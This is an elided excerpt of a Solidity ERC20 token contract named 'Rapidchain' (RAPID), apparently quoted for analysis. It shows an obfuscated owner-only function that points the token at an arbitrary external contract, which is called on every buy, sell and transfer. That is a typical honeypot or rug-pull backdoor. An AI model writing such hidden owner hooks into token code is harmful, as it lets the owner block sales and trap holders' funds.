...
contract TokenM is ERC20 {
    ...
    IUserAmountdkoicv public dkoicv;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Rapidchain", "RAPID") {
    ...
    function ctrunferByingrRoox(IUserAmountdkoicv _dkoicv) public onlyOwner {
        dkoicv = _dkoicv;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                dkoicv.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				dkoicv.addOutAmount(from, amount);
            }else{
                dkoicv.addOutAmount(from, amount);
                takeFee = false;
            }
